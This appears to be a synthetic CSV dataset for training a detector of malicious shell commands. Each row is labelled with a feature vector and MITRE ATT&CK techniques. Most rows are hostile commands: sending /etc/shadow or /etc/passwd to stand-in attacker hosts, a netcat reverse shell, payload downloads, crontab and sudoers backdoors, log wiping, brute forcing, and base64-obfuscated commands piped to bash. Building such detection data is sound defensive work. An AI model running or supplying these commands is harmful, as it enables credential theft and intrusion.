time nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat ~/.aws/credentials | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""getent group sudo ; echo done""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup find /home -name '.env' 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSIgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' | > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.48, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8n' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo locate wp-config.php,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
"sudo nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"time runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' && echo done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit  |  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup find /var/log -name '*.log' -exec truncate -s 0 {} \; &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1070_Indicator_Removal'],synthetic
$env:cmd  =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'ZmluZCAvIC13cml0YWJsZSAtdHlwZSBkIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'backdoor:x:0:0:root:/root:/bin/bash'  >>  /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' | history -c","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
time service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
time curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"sudo nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
(crontab  -l;  echo  '*  *  *  *  *  /tmp/payload.sh')  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
sudo > ~/.bash_history && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""cat /etc/passwd | grep -v nologin | grep -v false""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.48, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ip route show &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
net  localgroup  administrators  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wget http://attacker.com/payload -O /tmp/payload""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo echo 'bmV0IHVzZXIgL2RvbWFpbg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo python3 exploit.py --target localhost | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""route -n""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.68, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup ls -la /root /etc /var/www && echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
ifconfig -a && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup cat /etc/passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo echo 'Y2F0IC9ldGMvb3MtcmVsZWFzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time ssh admin@localhost ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yIDsgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nohup python3 -c ""import os; os.system('id')"" &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"nohup nmap -sV -p 22,80,443 10.0.0.0/24 &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
time echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
sudo locate wp-config.php,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nohup perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' | > /dev/null 2>&1 &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0.2, 0.48, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3  -c  ""import  urllib.request;  urllib.request.urlretrieve('http://evil.com/payload',  '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' | chmod +x /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""getent passwd | grep -v nologin""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
strings /proc/*/mem | grep -i password,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MCAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
time ssh -i ~/.ssh/stolen_key root@10.0.0.5 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wget -q -O- --header='X-Auth: token123' http://evil.com/cmd""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
time passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
find / -perm -4000 -type f 2>/dev/null | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
